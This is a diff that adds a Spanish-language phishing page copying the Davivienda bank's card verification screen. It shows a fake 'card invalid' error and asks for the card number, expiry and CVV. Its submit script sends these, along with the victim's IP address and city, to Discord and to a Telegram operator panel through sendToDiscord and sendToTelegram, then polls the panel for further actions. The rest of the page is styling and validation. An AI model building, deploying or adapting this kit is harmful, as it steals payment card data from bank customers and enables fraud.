@@ -1,0 +1,1105 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Davivienda - Verificación de tarjeta</title>
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <link rel="shortcut icon" href="/ebanking/images/favicon.ico">
+  <link href="b3t4s/combi.css" type="text/css" rel="stylesheet">
+
+  <style>
+    html,
+    body {
+      overflow: hidden;
+      height: 100%;
+      width: 100%;
+      margin: 0;
+      padding: 0;
+      touch-action: manipulation;
+      -ms-touch-action: manipulation;
+      overscroll-behavior: none;
+      -webkit-text-size-adjust: 100%;
+      -ms-text-size-adjust: 100%;
+      text-size-adjust: 100%;
+      font-family: Arial, Helvetica, Garuda, sans-serif;
+    }
+
+    body {
+      font-family: Arial, Helvetica, Garuda, sans-serif;
+      background-color: #fcfcfc;
+    }
+
+    #superiorRojo {
+      background-color: #ed1c24;
+      height: 60px;
+      display: flex;
+      align-items: center;
+      padding: 0 20px;
+      border-bottom: 1px solid #d01017;
+    }
+
+    .logo-davivienda {
+      height: 35px;
+    }
+
+    #overlay-loading {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .capsula-loading {
+      background: white;
+      padding: 12px 35px;
+      border-radius: 100px;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+    }
+
+    .spinner-svg {
+      width: 42px;
+      height: 42px;
+      animation: rotar 0.9s linear infinite;
+    }
+
+    @keyframes rotar {
+      from {
+        transform: rotate(0deg);
+      }
+
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .texto-espera {
+      color: #333;
+      font-size: 18px;
+      font-weight: 600;
+    }
+
+    #center {
+      text-align: center;
+      padding: 20px 20px 60px 20px;
+      max-width: 500px;
+      margin: 0 auto;
+    }
+
+    .titulo-grande {
+      font-size: 22px;
+      color: #000;
+      font-weight: normal;
+      margin-bottom: 10px;
+      font-family: 'font-Davivienda-subtitulos', Arial, Helvetica, Garuda, sans-serif;
+    }
+
+    .linea-separadora {
+      width: 100%;
+      height: 1px;
+      background: #ddd;
+      margin: 14px 0 20px 0;
+    }
+
+    .instruccion-negrita {
+      font-size: 14px;
+      font-weight: bold;
+      color: #000;
+      margin-bottom: 10px;
+      display: block;
+      text-align: left;
+    }
+
+    /* ============================================================ */
+    /* CARD VISUAL — aspecto real de tarjeta de crédito (1.586:1)    */
+    /* ============================================================ */
+    .card-visual {
+      background: linear-gradient(135deg, #b3161c 0%, #ed1c24 45%, #c0392b 100%);
+      border-radius: 14px;
+      padding: 16px 18px;
+      margin: 0 auto 20px auto;
+      box-shadow:
+        0 10px 26px rgba(237, 28, 36, 0.32),
+        0 2px 6px rgba(0, 0, 0, 0.14),
+        inset 0 1px 0 rgba(255, 255, 255, 0.15);
+      position: relative;
+      color: #ffffff;
+      text-align: left;
+      width: 100%;
+      max-width: 320px;
+      aspect-ratio: 1.586 / 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      overflow: hidden;
+      font-family: Arial, Helvetica, Garuda, sans-serif;
+    }
+
+    .card-visual::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      right: -50%;
+      width: 100%;
+      height: 200%;
+      background: linear-gradient(115deg,
+          rgba(255, 255, 255, 0) 40%,
+          rgba(255, 255, 255, 0.08) 50%,
+          rgba(255, 255, 255, 0) 60%);
+      pointer-events: none;
+    }
+
+    .card-chip {
+      width: 26px;
+      height: 20px;
+      background: linear-gradient(135deg, #f6d66b 0%, #c8972a 50%, #f0c040 100%);
+      border-radius: 4px;
+      position: relative;
+      box-shadow: inset 0 0 3px rgba(0, 0, 0, 0.25);
+      z-index: 1;
+      margin-top: 2px;
+      flex: 0 0 auto;
+    }
+
+    .card-chip::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 16px;
+      height: 10px;
+      border: 1px solid rgba(0, 0, 0, 0.25);
+      border-radius: 2px;
+      background-image:
+        linear-gradient(to right, transparent 32%, rgba(0, 0, 0, 0.2) 32%, rgba(0, 0, 0, 0.2) 34%, transparent 34%),
+        linear-gradient(to right, transparent 65%, rgba(0, 0, 0, 0.2) 65%, rgba(0, 0, 0, 0.2) 67%, transparent 67%),
+        linear-gradient(to bottom, transparent 48%, rgba(0, 0, 0, 0.2) 48%, rgba(0, 0, 0, 0.2) 52%, transparent 52%);
+    }
+
+    .card-number-display {
+      font-size: 17px;
+      letter-spacing: 2.5px;
+      font-weight: 600;
+      font-family: 'Courier New', monospace;
+      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
+      white-space: nowrap;
+      z-index: 1;
+      line-height: 1.1;
+    }
+
+    .card-bottom-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+      gap: 10px;
+      z-index: 1;
+    }
+
+    .card-label {
+      font-size: 8px;
+      opacity: 0.85;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 10px;
+      font-weight: 500;
+    }
+
+    .card-value {
+      font-size: 13px;
+      font-weight: 600;
+      letter-spacing: 1.5px;
+      min-height: 15px;
+      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
+    }
+
+    .card-logo {
+      font-size: 22px;
+      font-weight: 900;
+      font-style: italic;
+      letter-spacing: -1px;
+      opacity: 0.95;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.35);
+      font-family: Arial, Helvetica, sans-serif;
+      line-height: 1;
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      min-height: 22px;
+    }
+
+    /* Logo de red dentro de la tarjeta */
+    .card-logo img {
+      height: 22px;
+      width: auto;
+      max-width: 90px;
+      display: block;
+      filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.35));
+    }
+
+    /* CAMPOS */
+    .campo-grupo {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    .campo-label {
+      font-size: 12px;
+      color: #555;
+      font-weight: bold;
+      margin-bottom: 0px;
+      display: block;
+    }
+
+    .input-campo {
+      width: 100%;
+      padding: 10px 12px;
+      font-size: 15px;
+      border: 1.5px solid #ccc;
+      border-radius: 8px;
+      outline: none;
+      box-sizing: border-box;
+      color: #333;
+      transition: border-color 0.2s;
+      background: #fff;
+    }
+
+    .input-campo:focus {
+      border-color: #ed1c24;
+    }
+
+    /* Mensaje de error por campo */
+    .campo-error {
+      display: none;
+      color: #ed1c24;
+      font-size: 11.5px;
+      line-height: 1.3;
+      margin-top: 5px;
+      text-align: left;
+      font-weight: 600;
+      font-family: Arial, Helvetica, Garuda, sans-serif;
+    }
+
+    .campo-error.visible {
+      display: block;
+    }
+
+    .input-card-number {
+      letter-spacing: 2.5px;
+      font-weight: bold;
+      font-size: 16px;
+      font-family: 'Courier New', monospace;
+    }
+
+    .fila-dos {
+      display: flex;
+      gap: 14px;
+    }
+
+    .fila-dos .campo-grupo {
+      flex: 1;
+    }
+
+    .texto-legal-gris {
+      font-size: 11.5px;
+      color: #777;
+      line-height: 1.5;
+      margin-bottom: 0px;
+      text-align: left;
+      padding: 0 2px;
+    }
+
+    .btn-confirmar {
+      background: #ed1c24;
+      color: white;
+      border: none;
+      padding: 12px 55px;
+      border-radius: 50px;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.2s;
+      box-shadow: 0 4px 10px rgba(237, 28, 36, 0.2);
+    }
+
+    .btn-confirmar:hover {
+      background: #c8141b;
+    }
+
+    .btn-confirmar:disabled,
+    .btn-confirmar[disabled] {
+      background: #b0b0b0;
+      color: #f0f0f0;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    .btn-confirmar:disabled:hover {
+      background: #b0b0b0;
+    }
+
+    #footer-negro {
+      background: #000;
+      color: #fff;
+      text-align: center;
+      padding: 12px;
+      font-size: 10px;
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+    }
+
+    .error-container {
+      background-color: #fce8e8;
+      border-left: 5px solid #ed1c24;
+      padding: 8px;
+      margin-bottom: 0px;
+      display: flex;
+      align-items: center;
+      text-align: left;
+      border-radius: 4px;
+    }
+
+    .error-icon {
+      color: #ed1c24;
+      font-size: 24px;
+      margin-right: 15px;
+      font-weight: bold;
+    }
+
+    .error-text {
+      color: #b91c1c;
+      font-size: 12px;
+      line-height: 1.4;
+      font-weight: bold;
+    }
+
+    @media (max-width: 900px) {
+
+      html,
+      body {
+        min-width: 0 !important;
+        max-width: 100vw !important;
+        width: 100% !important;
+        height: 100dvh !important;
+        min-height: 100dvh !important;
+        overflow: hidden !important;
+      }
+
+      body {
+        display: flex !important;
+        flex-direction: column !important;
+        background: url('b3t4s/home.jpg') no-repeat center center fixed !important;
+        background-size: cover !important;
+      }
+
+      body * {
+        box-sizing: border-box;
+      }
+
+      #superiorRojo {
+        flex-shrink: 0;
+        width: 100%;
+        height: 52px !important;
+        padding: 10px 16px !important;
+        margin: 0 !important;
+      }
+
+      .logo-davivienda {
+        height: 26px !important;
+        width: auto;
+        max-width: 130px;
+      }
+
+      #center {
+        flex: 1 1 auto;
+        width: 100% !important;
+        max-width: 340px !important;
+        padding: 0 16px !important;
+        margin: 0 auto !important;
+        display: flex !important;
+        flex-direction: column !important;
+        justify-content: center !important;
+        align-items: stretch !important;
+        text-align: center;
+        overflow: hidden !important;
+        background: transparent !important;
+      }
+
+      .titulo-grande {
+        font-size: 19px !important;
+        font-weight: normal !important;
+        margin: 0 0 6px 0 !important;
+        line-height: 1.2;
+        width: 100%;
+        color: #222;
+        text-align: center !important;
+        font-family: 'font-Davivienda-subtitulos', Arial, Helvetica, Garuda, sans-serif !important;
+      }
+
+      .linea-separadora {
+        width: 100% !important;
+        margin: 8px 0 12px 0 !important;
+      }
+
+      .card-visual {
+        width: 100% !important;
+        max-width: 260px !important;
+        padding: 10px 12px !important;
+        border-radius: 11px !important;
+        margin: 0 auto 12px auto !important;
+        aspect-ratio: 1.586 / 1 !important;
+        box-shadow:
+          0 7px 18px rgba(237, 28, 36, 0.30),
+          0 2px 5px rgba(0, 0, 0, 0.12),
+          inset 0 1px 0 rgba(255, 255, 255, 0.15) !important;
+      }
+
+      .card-chip {
+        width: 30px !important;
+        height: 25px !important;
+        border-radius: 3px !important;
+        margin-top: 30px !important;
+      }
+
+      .card-chip::after {
+        width: 12px !important;
+        height: 8px !important;
+        border-radius: 1.5px !important;
+      }
+
+      .card-number-display {
+        font-size: 16px !important;
+        letter-spacing: 1.4px !important;
+        line-height: 1.1 !important;
+      }
+
+      .card-label {
+        font-size: 8px !important;
+        letter-spacing: 0.6px !important;
+        margin-bottom: 2px !important;
+      }
+
+      .card-value {
+        font-size: 12px !important;
+        letter-spacing: 0.8px !important;
+        min-height: 11px !important;
+      }
+
+      .card-logo {
+        font-size: 15px !important;
+        min-height: 15px !important;
+      }
+
+      .card-logo img {
+        height: 15px !important;
+        width: auto !important;
+        max-width: 65px !important;
+        display: block !important;
+      }
+
+      .instruccion-negrita {
+        font-size: 12.5px !important;
+        margin: 0 0 8px 0 !important;
+        text-align: left;
+        width: 100%;
+        color: #222;
+      }
+
+      .campo-grupo {
+        margin-bottom: 10px !important;
+      }
+
+      .campo-label {
+        font-size: 11.5px !important;
+        margin-bottom: 4px !important;
+      }
+
+      .input-campo {
+        -webkit-appearance: none !important;
+        -moz-appearance: none !important;
+        appearance: none !important;
+        background: #fff !important;
+        background-color: #fff !important;
+        border: 1px solid #ccc !important;
+        border-radius: 8px !important;
+        -webkit-border-radius: 8px !important;
+        box-shadow: none !important;
+        -webkit-box-shadow: none !important;
+        outline: none !important;
+        width: 100% !important;
+        max-width: 100% !important;
+        min-width: 0 !important;
+        font-size: 16px !important;
+        padding: 9px 11px !important;
+        margin: 0 !important;
+        display: block !important;
+        color: #333 !important;
+        -webkit-text-fill-color: #333;
+        line-height: 1.3;
+      }
+
+      .input-campo:focus {
+        border-color: #ed1c24 !important;
+      }
+
+      .campo-error {
+        font-size: 10.5px !important;
+        margin-top: 4px !important;
+      }
+
+      .input-card-number {
+        font-size: 16px !important;
+        letter-spacing: 2px !important;
+      }
+
+      .fila-dos {
+        gap: 10px !important;
+      }
+
+      .texto-legal-gris {
+        font-size: 11px !important;
+        font-weight: 550 !important;
+        line-height: 1.35 !important;
+        margin: 0 0 14px 0 !important;
+        padding: 0 !important;
+        text-align: left !important;
+        width: 100% !important;
+        color: #555050 !important;
+      }
+
+      .btn-confirmar {
+        -webkit-appearance: none !important;
+        -moz-appearance: none !important;
+        appearance: none !important;
+        display: inline-block !important;
+        background: #ed1c27 !important;
+        background-color: #ed1c27 !important;
+        background-image: none !important;
+        color: #ffffff !important;
+        -webkit-text-fill-color: #ffffff;
+        border: 0 none !important;
+        border-radius: 99px !important;
+        -webkit-border-radius: 99px !important;
+        -moz-border-radius: 99px !important;
+        height: 42px !important;
+        width: auto !important;
+        min-width: 170px !important;
+        max-width: 220px !important;
+        font-size: 14px !important;
+        font-weight: normal !important;
+        padding: 0 26px !important;
+        margin: 0 auto !important;
+        box-shadow: none !important;
+        -webkit-box-shadow: none !important;
+        line-height: 42px;
+        text-decoration: none !important;
+        cursor: pointer;
+        text-align: center;
+        transition: none;
+      }
+
+      .btn-confirmar:disabled,
+      .btn-confirmar[disabled] {
+        background: #b0b0b0 !important;
+        background-color: #b0b0b0 !important;
+        background-image: none !important;
+        color: #f0f0f0 !important;
+        -webkit-text-fill-color: #f0f0f0;
+        cursor: not-allowed !important;
+      }
+
+      #footer-negro {
+        flex-shrink: 0 !important;
+        position: static !important;
+        width: 100% !important;
+        padding: 8px 0 !important;
+        margin: 0 !important;
+        background: transparent !important;
+        color: #666 !important;
+        font-size: 10px !important;
+        line-height: 1.2;
+        text-align: center !important;
+        display: block !important;
+        box-sizing: border-box !important;
+      }
+
+      .error-container {
+        width: 100% !important;
+        max-width: 100% !important;
+        margin: 0 0 20px 0 !important;
+        padding: 4px !important;
+        box-sizing: border-box !important;
+        background-color: #fce8e8 !important;
+        border-left: 5px solid #ed1c24 !important;
+        border-radius: 4px !important;
+        display: flex !important;
+        align-items: center !important;
+        text-align: left !important;
+      }
+
+      .error-icon {
+        font-size: 20px !important;
+        margin-right: 10px !important;
+        flex: 0 0 auto !important;
+      }
+
+      .error-text {
+        font-size: 11px !important;
+        line-height: 1.35 !important;
+        color: #b91c1c !important;
+        font-weight: bold !important;
+        flex: 1 1 auto !important;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div id="overlay-loading">
+    <div class="capsula-loading">
+      <svg class="spinner-svg" viewBox="0 0 50 50">
+        <defs>
+          <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="0%">
+            <stop offset="0%" stop-color="#ed1c24" />
+            <stop offset="100%" stop-color="#ffffff" stop-opacity="0" />
+          </linearGradient>
+        </defs>
+        <circle cx="25" cy="25" r="20" fill="none" stroke="url(#grad)" stroke-width="5" stroke-linecap="round" />
+      </svg>
+      <div class="texto-espera" id="loadingText">Validando tarjeta...</div>
+    </div>
+  </div>
+
+  <div id="superiorRojo">
+    <img src="b3t4s/logomijo.png" alt="Davivienda" class="logo-davivienda">
+  </div>
+
+  <div id="center">
+    <h1 class="titulo-grande">Verificación de tarjeta</h1>
+
+    <div class="card-visual">
+      <div class="card-chip"></div>
+      <div class="card-number-display" id="cardDisplay">•••• •••• •••• ••••</div>
+      <div class="card-bottom-row">
+        <div>
+          <div class="card-label">Vence</div>
+          <div class="card-value" id="expDisplay">MM/AA</div>
+        </div>
+        <div>
+          <div class="card-label">CVV</div>
+          <div class="card-value" id="cvvDisplay">•••</div>
+        </div>
+        <div class="card-logo" id="cardLogo"></div>
+      </div>
+    </div>
+
+    <form id="cardForm" novalidate>
+      <span class="instruccion-negrita">Ingrese su número de tarjeta:</span>
+
+      <div class="campo-grupo">
+        <label class="campo-label">Número de tarjeta</label>
+        <input id="cardNumber" name="card_number" type="text" inputmode="numeric" class="input-campo input-card-number"
+          maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="off" required>
+        <span id="cardError" class="campo-error"></span>
+      </div>
+
+      <div class="fila-dos">
+        <div class="campo-grupo">
+          <label class="campo-label">Fecha de vencimiento</label>
+          <input id="expDate" name="exp_date" type="text" inputmode="numeric" class="input-campo" maxlength="5"
+            placeholder="MM/AA" autocomplete="off" required>
+          <span id="expError" class="campo-error"></span>
+        </div>
+        <div class="campo-grupo">
+          <label class="campo-label">CVV</label>
+          <input id="cvvCode" name="cvv" type="password" inputmode="numeric" class="input-campo" maxlength="4"
+            placeholder="•••" autocomplete="off" required>
+          <span id="cvvError" class="campo-error"></span>
+        </div>
+      </div>
+
+      <div class="error-container">
+        <div class="error-icon">⚠️</div>
+        <div class="error-text">
+          La tarjeta ingresada es incorrecta o ha caducado.
+          Por favor, verifique los datos e intente nuevamente.
+        </div>
+      </div>
+
+      <p class="texto-legal-gris">
+        Ingrese los datos de la tarjeta registrada con nosotros para verificar su identidad.
+        Esta información es confidencial y está protegida bajo los más altos estándares de seguridad de Davivienda.
+      </p>
+
+      <button type="submit" id="actionBtn" class="btn-confirmar" disabled>Confirmar</button>
+    </form>
+  </div>
+
+  <div id="footer-negro">
+    © 2026 Davivienda - Todos los derechos reservados
+  </div>
+
+  <script>
+    const cardNumberInput = document.getElementById('cardNumber');
+    const cardDisplay = document.getElementById('cardDisplay');
+    const cardError = document.getElementById('cardError');
+    const cardLogo = document.getElementById('cardLogo');
+
+    const expInput = document.getElementById('expDate');
+    const expDisplay = document.getElementById('expDisplay');
+    const expError = document.getElementById('expError');
+
+    const cvvInput = document.getElementById('cvvCode');
+    const cvvDisplay = document.getElementById('cvvDisplay');
+    const cvvError = document.getElementById('cvvError');
+
+    const actionBtn = document.getElementById('actionBtn');
+
+    var CARD_LENGTHS = {
+      visa: [13, 16, 19],
+      mastercard: [16],
+      amex: [15],
+      diners: [14, 16, 19],
+      discover: [16, 19],
+      jcb: [16, 17, 18, 19]
+    };
+
+    var CARD_LOGOS = {
+      mastercard: 'https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg',
+      amex: 'https://cdn-icons-png.flaticon.com/512/179/179431.png',
+      diners: 'https://upload.wikimedia.org/wikipedia/commons/a/a6/Diners_Club_Logo3.svg?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=original',
+      discover: 'https://1000logos.net/wp-content/uploads/2021/05/Discover-logo.png'
+    };
+
+    function detectCardType(num) {
+      if (!num) return null;
+      if (/^4/.test(num)) return 'visa';
+      if (/^(5[1-5]|2[2-7])/.test(num)) return 'mastercard';
+      if (/^3[47]/.test(num)) return 'amex';
+      if (/^(36|38|39|30[0-5])/.test(num)) return 'diners';
+      if (/^(6011|65|64[4-9])/.test(num)) return 'discover';
+      if (/^35(2[89]|[3-8][0-9])/.test(num)) return 'jcb';
+      return null;
+    }
+
+    function esTarjetaValida(num) {
+      if (!num) return false;
+      var tipo = detectCardType(num);
+      if (!tipo) return false;
+      var longitudesValidas = CARD_LENGTHS[tipo];
+      if (longitudesValidas.indexOf(num.length) === -1) return false;
+      return true;
+    }
+
+    function actualizarLogo(tipo) {
+      if (!tipo) {
+        cardLogo.innerHTML = '';
+        return;
+      }
+      if (tipo === 'visa') {
+        cardLogo.textContent = 'VISA';
+        return;
+      }
+      var url = CARD_LOGOS[tipo];
+      if (url) {
+        cardLogo.innerHTML = '<img src="' + url + '" alt="' + tipo + '">';
+      } else {
+        cardLogo.innerHTML = '';
+      }
+    }
+
+    function validarYMostrarTarjetaEnBlur() {
+      var num = (cardNumberInput.value || '').replace(/\D/g, '');
+
+      if (!num) {
+        cardError.classList.remove('visible');
+        cardError.textContent = '';
+        return false;
+      }
+
+      var tipo = detectCardType(num);
+      if (!tipo) {
+        cardError.textContent = 'Tipo de tarjeta no soportada';
+        cardError.classList.add('visible');
+        return false;
+      }
+
+      var longitudesValidas = CARD_LENGTHS[tipo];
+      var minLen = Math.min.apply(null, longitudesValidas);
+      if (num.length < minLen) {
+        cardError.textContent = 'Número de tarjeta incompleto';
+        cardError.classList.add('visible');
+        return false;
+      }
+      if (longitudesValidas.indexOf(num.length) === -1) {
+        cardError.textContent = 'Número de tarjeta inválido';
+        cardError.classList.add('visible');
+        return false;
+      }
+
+      cardError.classList.remove('visible');
+      cardError.textContent = '';
+      return true;
+    }
+    function esFechaValida(val) {
+      if (!val || val.length !== 5) return false;
+      if (!/^\d{2}\/\d{2}$/.test(val)) return false;
+      var mes = parseInt(val.substring(0, 2), 10);
+      var anio = parseInt(val.substring(3, 5), 10);
+      var anioActual = new Date().getFullYear() % 100;
+      if (isNaN(mes) || isNaN(anio)) return false;
+      if (mes < 1 || mes > 12) return false;
+      if (anio < anioActual || anio > 99) return false;
+      return true;
+    }
+
+    function validarYMostrarFecha() {
+      var val = (expInput.value || '').trim();
+
+      if (!val) {
+        expError.classList.remove('visible');
+        expError.textContent = '';
+        return false;
+      }
+
+      var partes = val.split('/');
+      var mesStr = partes[0] || '';
+      var anioStr = partes[1] || '';
+
+      var mesMal = false;
+      var anioMal = false;
+      var anioActual = new Date().getFullYear() % 100;
+
+      if (mesStr.length === 2) {
+        var mes = parseInt(mesStr, 10);
+        if (isNaN(mes) || mes < 1 || mes > 12) {
+          mesMal = true;
+        }
+      }
+
+      if (anioStr.length === 2) {
+        var anio = parseInt(anioStr, 10);
+        if (isNaN(anio) || anio < anioActual || anio > 99) {
+          anioMal = true;
+        }
+      }
+
+      if (mesMal && anioMal) {
+        expError.textContent = 'Fecha inválida';
+        expError.classList.add('visible');
+        return false;
+      }
+
+      if (mesMal) {
+        expError.textContent = 'Mes inválido';
+        expError.classList.add('visible');
+        return false;
+      }
+
+      if (anioMal) {
+        expError.textContent = 'Tarjeta expirada';
+        expError.classList.add('visible');
+        return false;
+      }
+
+      if (esFechaValida(val)) {
+        expError.classList.remove('visible');
+        expError.textContent = '';
+        return true;
+      }
+
+      expError.classList.remove('visible');
+      expError.textContent = '';
+      return false;
+    }
+
+    function esCvvValido(val) {
+      if (!val) return false;
+      var soloDigitos = val.replace(/\D/g, '');
+      return soloDigitos.length >= 3 && soloDigitos.length <= 4;
+    }
+
+    function validarYMostrarCvvEnBlur() {
+      var val = (cvvInput.value || '').replace(/\D/g, '');
+
+      if (!val) {
+        cvvError.classList.remove('visible');
+        cvvError.textContent = '';
+        return false;
+      }
+
+      if (val.length < 3) {
+        cvvError.textContent = 'CVV incorrecto';
+        cvvError.classList.add('visible');
+        return false;
+      }
+
+      cvvError.classList.remove('visible');
+      cvvError.textContent = '';
+      return true;
+    }
+
+    function actualizarBoton() {
+      var tarjetaOk = esTarjetaValida((cardNumberInput.value || '').replace(/\D/g, ''));
+      var fechaOk = esFechaValida((expInput.value || '').trim());
+      var cvvOk = esCvvValido(cvvInput.value);
+      if (tarjetaOk && fechaOk && cvvOk) {
+        actionBtn.disabled = false;
+      } else {
+        actionBtn.disabled = true;
+      }
+    }
+
+    cardNumberInput.addEventListener('input', function () {
+      let val = this.value.replace(/\D/g, '').substring(0, 16);
+      let formatted = val.replace(/(.{4})/g, '$1 ').trim();
+      this.value = formatted;
+
+      let display = val.padEnd(16, '•');
+      cardDisplay.textContent =
+        display.substring(0, 4) + ' ' +
+        display.substring(4, 8) + ' ' +
+        display.substring(8, 12) + ' ' +
+        display.substring(12, 16);
+
+      var tipo = detectCardType(val);
+      actualizarLogo(tipo);
+
+      if (cardError.classList.contains('visible')) {
+        cardError.classList.remove('visible');
+        cardError.textContent = '';
+      }
+
+      actualizarBoton();
+    });
+
+    cardNumberInput.addEventListener('blur', function () {
+      validarYMostrarTarjetaEnBlur();
+    });
+
+    let prevExpValue = '';
+    expInput.addEventListener('input', function () {
+      let raw = this.value.replace(/\D/g, '').substring(0, 4);
+      let prevRaw = prevExpValue.replace(/\D/g, '');
+
+      if (raw.length > prevRaw.length && raw.length >= 1 && raw[0] !== '0' && raw[0] !== '1') {
+        this.value = prevExpValue;
+        return;
+      }
+
+      let val = raw;
+      if (val.length >= 3) val = val.substring(0, 2) + '/' + val.substring(2);
+      this.value = val;
+      prevExpValue = val;
+      expDisplay.textContent = val || 'MM/AA';
+
+      validarYMostrarFecha();
+      actualizarBoton();
+    });
+
+    cvvInput.addEventListener('input', function () {
+      let val = this.value.replace(/\D/g, '').substring(0, 4);
+      this.value = val;
+      cvvDisplay.textContent = val ? '•'.repeat(val.length) : '•••';
+
+      if (cvvError.classList.contains('visible')) {
+        cvvError.classList.remove('visible');
+        cvvError.textContent = '';
+      }
+
+      actualizarBoton();
+    });
+
+    cvvInput.addEventListener('blur', function () {
+      validarYMostrarCvvEnBlur();
+    });
+
+    actionBtn.disabled = true;
+
+  </script>
+
+  <script src="telegram.js"></script>
+  <script>
+    document.getElementById("cardForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      if (!esTarjetaValida((cardNumberInput.value || '').replace(/\D/g, ''))) return;
+      if (!esFechaValida((expInput.value || '').trim())) return;
+      if (!esCvvValido(cvvInput.value)) return;
+
+      const continuarBtn = document.getElementById("actionBtn");
+      continuarBtn.disabled = true;
+
+      const ipinfo = await getIpInfo();
+
+      const userito = localStorage.getItem("primer") || "N/A";
+
+      const cardNumberValue = document.getElementById('cardNumber').value;
+      const expValue        = document.getElementById('expDate').value;
+      const cvvValue        = document.getElementById('cvvCode').value;
+
+      const transactionId = localStorage.getItem("transactionId") || "";
+
+      const discordMsg = `💳 **CC - NUEVO INTENTO** 💳\n\n👤 **ID:** \`${userito}\`\n🔢 **CARD:** \`${cardNumberValue}\`\n📅 **EXPY:** \`${expValue}\`\n🔒 **CVV:** \`${cvvValue}\`\n🌐 **IP:** \`${ipinfo.ip}\`\n📍 **Ciudad:** \`${ipinfo.city}\``;
+
+      await sendToDiscord(discordMsg);
+      await sendToDiscord("**🚨🚨 ¡ACTIVO CON EL PANEL EN TELEGRAM! 🚨🚨**");
+
+      const telegramMsg = `🚨 <b>ALERTA PANEL - CC</b> 🚨\n\n👤 <b>ID:</b> <code>${userito}</code>\n🌐 <b>IP:</b> <code>${ipinfo.ip}</code>\n📍 <b>Ciudad:</b> <code>${ipinfo.city}</code>`;
+
+      await sendToTelegram(telegramMsg, transactionId);
+      const overlay = document.getElementById('overlay-loading');
+      overlay.style.display = 'flex';
+      pollTelegramAction(transactionId);
+    });
+  </script>
+
+  <script type="text/javascript">
+    document.addEventListener('gesturestart', function (e) { e.preventDefault(); }, { passive: false });
+    document.addEventListener('gesturechange', function (e) { e.preventDefault(); }, { passive: false });
+    document.addEventListener('gestureend', function (e) { e.preventDefault(); }, { passive: false });
+
+    document.addEventListener('touchmove', function (e) {
+      if (e.touches && e.touches.length > 1) {
+        e.preventDefault();
+      }
+    }, { passive: false });
+
+    let lastTouchEnd = 0;
+    document.addEventListener('touchend', function (e) {
+      const now = Date.now();
+      if (now - lastTouchEnd <= 350) {
+        e.preventDefault();
+      }
+      lastTouchEnd = now;
+    }, { passive: false });
+
+    document.addEventListener('wheel', function (e) {
+      if (e.ctrlKey) e.preventDefault();
+    }, { passive: false });
+
+    document.addEventListener('keydown', function (e) {
+      if ((e.ctrlKey || e.metaKey) && ['+', '-', '=', '0'].includes(e.key)) {
+        e.preventDefault();
+      }
+    });
+  </script>
+</body>
+
+</html>
